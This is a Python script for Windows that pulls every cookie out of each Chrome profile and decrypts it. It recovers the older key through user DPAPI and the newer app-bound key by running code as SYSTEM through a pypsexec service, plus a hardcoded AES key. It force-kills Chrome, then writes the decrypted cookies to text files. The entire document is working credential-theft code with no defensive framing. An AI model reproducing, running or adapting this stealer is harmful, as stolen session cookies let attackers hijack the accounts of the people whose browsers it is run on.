import os
import json
import sys
import binascii
import sqlite3
import base64
import ctypes
from subprocess import run, CREATE_NEW_CONSOLE, SW_HIDE
from pypsexec.client import Client
from Crypto.Cipher import AES
import pyaes

# Get the user's Chrome profile path
user_profile = os.environ['USERPROFILE']
chrome_data_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data"
local_state_path = rf"{chrome_data_path}\Local State"

# Load the local state to access encryption keys
with open(local_state_path, "r", encoding="utf-8") as f:
    local_state = json.load(f)

app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
profile_list = local_state['profile']['profiles_order']
v10_encryption_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]

def decrypt_data(encrypted_data: bytes, optional_entropy: str = None) -> bytes:
    """Decrypt data using the Windows CryptUnprotectData API."""

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [
            ("cbData", ctypes.c_ulong),
            ("pbData", ctypes.POINTER(ctypes.c_ubyte))
        ]

    # Prepare the data blob for input
    input_data_blob = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
    output_data_blob = DATA_BLOB()
    optional_entropy_blob = None

    # Handle optional entropy if provided
    if optional_entropy is not None:
        optional_entropy = optional_entropy.encode("utf-16")
        optional_entropy_blob = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))

    # Call the CryptUnprotectData function
    if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(input_data_blob), None, ctypes.byref(optional_entropy_blob) if optional_entropy_blob else None, None, None, 0, ctypes.byref(output_data_blob)):
        data = (ctypes.c_ubyte * output_data_blob.cbData)()
        ctypes.memmove(data, output_data_blob.pbData, output_data_blob.cbData)
        ctypes.windll.Kernel32.LocalFree(output_data_blob.pbData)
        return bytes(data)

    raise ValueError("Invalid encrypted_data provided!")

def retrieve_v20_key():
    """Retrieve the decryption key for Chrome v20 cookies."""

    arguments = "-c \"" + """import win32crypt
    import binascii
    encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
    print(binascii.b2a_base64(encrypted_key[1]).decode())
    """.replace("\n", ";") + "\""

    client = Client("localhost")
    client.connect()

    try:
        client.create_service()

        # Validate and decode the app bound encrypted key
        assert (binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
        app_bound_encrypted_key_b64 = binascii.b2a_base64(binascii.a2b_base64(app_bound_encrypted_key)[4:]).decode().strip()

        # Decrypt the key using SYSTEM DPAPI
        encrypted_key_b64, stderr, rc = client.run_executable(
            sys.executable,
            arguments=arguments.format(app_bound_encrypted_key_b64),
            use_system_account=True
        )

        # Decrypt the key using user DPAPI
        decrypted_key_b64, stderr, rc = client.run_executable(
            sys.executable,
            arguments=arguments.format(encrypted_key_b64.decode().strip()),
            use_system_account=False
        )

        # Extract the decrypted key
        decrypted_key = binascii.a2b_base64(decrypted_key_b64)[-61:]
        assert (decrypted_key[0] == 1)

        # Decrypt the key with AES256GCM
        aes_key = binascii.a2b_base64("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")

        # Extract IV, ciphertext, and tag
        iv = decrypted_key[1:1 + 12]
        ciphertext = decrypted_key[1 + 12:1 + 12 + 32]
        tag = decrypted_key[1 + 12 + 32:]

        # Decrypt the key using AES
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
        key = cipher.decrypt_and_verify(ciphertext, tag)
        return key
    finally:
        try:
            client.remove_service()
        except:
            pass
        client.disconnect()

def decrypt_cookie(cookie_value, v10_key, v20_key) -> str:
    """Decrypt a cookie value using the provided keys."""

    try:
        if cookie_value[:3] == b"v10" or cookie_value[:3] == b"v11":
            return pyaes.AESModeOfOperationGCM(v10_key, cookie_value[3:15]).decrypt(cookie_value[15:])[:-16].decode()

        elif cookie_value[:3] == b"v20":
            cookie_iv = cookie_value[3:3 + 12]
            encrypted_cookie = cookie_value[3 + 12:-16]
            cookie_tag = cookie_value[-16:]
            cookie_cipher = AES.new(v20_key, AES.MODE_GCM, nonce=cookie_iv)
            decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
            return decrypted_cookie[32:].decode('utf-8')
    except Exception as e:
        print(e)
        return "Failed Decoding"

def get_cookies():
    """Retrieve and decrypt Chrome cookies for each profile."""

    if not profile_list:
        print("no profiles found")
        sys.exit(1)

    v10_key = decrypt_data(v10_encryption_key)
    v20_key = retrieve_v20_key()

    # Kill any running Chrome instances
    run(f"taskkill /f /im chrome.exe", shell=True, creationflags=CREATE_NEW_CONSOLE | SW_HIDE)

    for profile in profile_list:
        try:
            cookie_db_path = os.path.join(chrome_data_path, profile, 'Network', 'Cookies')
            con = sqlite3.connect(
                fr"file:{cookie_db_path}?mode=ro&immutable=1",
                uri=True,
                isolation_level=None,
                check_same_thread=False
            )
            cur = con.cursor()
            cookies_list = cur.execute("SELECT host_key, name, path, CAST(encrypted_value AS BLOB), expires_utc FROM cookies").fetchall()
            con.close()
            cookies_list_filtered = [row for row in cookies_list if row[0] != ""]

            data = "{0}\t{1}\t{2}\t{3}\t{4}\t{5}\t{6}\n"
            temp = [
                data.format(host, str(expiry != 0).upper(), pathc, str(not host.startswith('.')).upper(), expiry, name,
                            decrypt_cookie(cookiec, v10_key, v20_key))
                for host, name, pathc, cookiec, expiry in cookies_list_filtered
            ]
            with open(rf"{profile} Cookies.txt", '+w', encoding="utf-8") as cookietxt:
                cookies = "\n".join(row for row in temp)
                cookietxt.write(cookies)
        except Exception as e:
            print(e)


get_cookies()
